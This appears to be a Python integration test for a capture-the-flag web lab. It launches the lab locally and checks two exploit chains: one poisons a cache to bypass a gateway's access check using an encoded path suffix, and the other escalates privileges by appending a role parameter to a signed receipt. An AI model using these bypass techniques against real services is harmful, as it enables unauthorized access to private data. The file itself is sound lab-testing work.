import unittest,subprocess,os,urllib.request,urllib.parse,json,socket,time
class Labs(unittest.TestCase):
 def start(self,mode):
  s=socket.socket();s.bind(('127.0.0.1',0));port=s.getsockname()[1];s.close()
  self.base=f'http://127.0.0.1:{port}';self.proc=subprocess.Popen(['python3','challenges/web/lab.py'],env={**os.environ,'PORT':str(port),'LAB_MODE':mode,'CHALLENGE_FLAG':'CTF{integration_only}'},stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
  self.addCleanup(self.stop)
  for _ in range(100):
   try:self.get('/');return
   except OSError:time.sleep(.02)
  self.fail('Lab did not start')
 def stop(self):self.proc.terminate();self.proc.wait(timeout=5)
 def get(self,p):return json.load(urllib.request.urlopen(self.base+p))
 def test_cache_requires_chain(self):
  self.start('cache')
  with self.assertRaises(urllib.error.HTTPError) as e:self.get('/gateway?path=/invoice/private')
  self.assertEqual(e.exception.code,403)
  self.assertEqual(self.get('/support/preview?path=/invoice/private%3Bpreview=1')['status'],'preview cached')
  self.assertEqual(self.get('/gateway?path=/invoice/private')['flag'],'CTF{integration_only}')
 def test_receipt_parser_chain(self):
  self.start('receipts');order=self.get('/checkout')['order'];r=self.get('/receipt?order='+order)
  def post(raw):return json.load(urllib.request.urlopen(urllib.request.Request(self.base+'/dispatch',data=raw.encode(),headers={'X-Signature':r['signature']})))
  with self.assertRaises(urllib.error.HTTPError):post(r['receipt'])
  with self.assertRaises(urllib.error.HTTPError):post(r['receipt'].replace('guest','dispatcher'))
  self.assertEqual(post(r['receipt']+'&role=dispatcher')['flag'],'CTF{integration_only}')
if __name__=='__main__':unittest.main()
